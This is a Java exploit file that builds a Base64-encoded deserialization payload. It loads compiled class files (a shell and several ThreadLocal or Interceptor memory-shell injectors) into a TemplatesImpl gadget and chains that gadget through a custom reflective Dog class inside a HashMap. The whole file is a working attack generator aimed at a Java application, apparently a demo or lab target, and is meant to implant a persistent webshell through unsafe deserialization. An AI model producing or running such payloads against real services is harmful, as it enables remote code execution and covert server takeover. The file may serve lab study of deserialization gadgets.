import com.example.demo.Dog.Dog;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;

import java.io.*;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.HashMap;

public class Exp2 {
    // 序列化并Base64编码
    public static String serializeBase64(Object obj) throws Exception {
        try (ByteArrayOutputStream baos = new ByteArrayOutputStream();
             ObjectOutputStream oos = new ObjectOutputStream(baos)) {
            oos.writeObject(obj);
            oos.flush();
            return Base64.getEncoder().encodeToString(baos.toByteArray());
        }
    }
    // Base64解码并反序列化
    public static Object unserializeBase64(String base64Data) throws IOException, ClassNotFoundException {
        byte[] data = Base64.getDecoder().decode(base64Data);
        try (ByteArrayInputStream bais = new ByteArrayInputStream(data);
             ObjectInputStream ois = new ObjectInputStream(bais)) {
            return ois.readObject();
        }
    }
    // 反射设置字段值
    public static void setField(Object obj, String fieldName, Object value) throws Exception{
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static void main(String[] args) throws Exception{
        // 利用TemplatesImpl进行动态类加载
        TemplatesImpl templates = new TemplatesImpl();
        byte[] code1 = Files.readAllBytes(Paths.get("E:/tmp/Shell.class"));
        byte[] code2 = Files.readAllBytes(Paths.get("E:/tmp/Inject_ThreadLocal.class"));
        byte[] code3 = Files.readAllBytes(Paths.get("E:/tmp/Inject_ThreadLocal_Pro.class"));
        byte[] code4 = Files.readAllBytes(Paths.get("E:/tmp/Inject_Interceptor.class"));
        byte[] code5 = Files.readAllBytes(Paths.get("E:/tmp/Inject_Interceptor_Pro.class"));
        byte[][] codes = {code5};
        setField(templates, "_name", "CC3");
        setField(templates, "_bytecodes", codes);
        setField(templates, "_tfactory", new TransformerFactoryImpl());

        Dog dog = new Dog(1,"dog","dog",1);

        HashMap<Object, Object> hashMap = new HashMap();
        hashMap.put(dog, null);

        setField(dog, "object", templates);
        setField(dog, "methodName", "newTransformer");
        setField(dog, "paramTypes", null);
        setField(dog, "args", null);

        String payload = serializeBase64(hashMap);
        System.out.println(payload);
//        unserializeBase64(payload);
    }
}
